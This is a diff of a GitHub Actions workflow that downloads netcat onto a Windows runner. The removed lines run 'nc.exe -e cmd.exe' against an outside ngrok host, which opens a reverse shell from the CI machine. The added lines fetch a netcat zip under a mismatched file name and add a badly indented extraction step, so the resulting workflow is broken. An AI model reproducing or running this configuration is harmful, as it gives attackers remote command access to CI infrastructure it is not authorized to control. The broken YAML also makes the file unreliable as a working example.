@@ -12,10 +12,11 @@ jobs:
 
     - name: Download
 
-      run: Invoke-WebRequest https://drive.google.com/u/0/uc?id=10A03gfezpkfaUBlYAvHajjc6w3amMGUM&export=download&confirm=t&uuid=5a0ad74d-c4bf-45cf-b53a-8194daeee8b3&at=ACjLJWlUMI8xonr0FrlVqUTYVFW_:1671585713468 -OutFile nc.exe
+      run: Invoke-WebRequest https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip -OutFile nc.exe
 
     - name: commands
-
-      run: nc.exe -v 0.tcp.in.ngrok.io 14912 -e cmd.exe
+         run:| tar -xf netcat-win32-1.11.zip
+          
+    
 
     
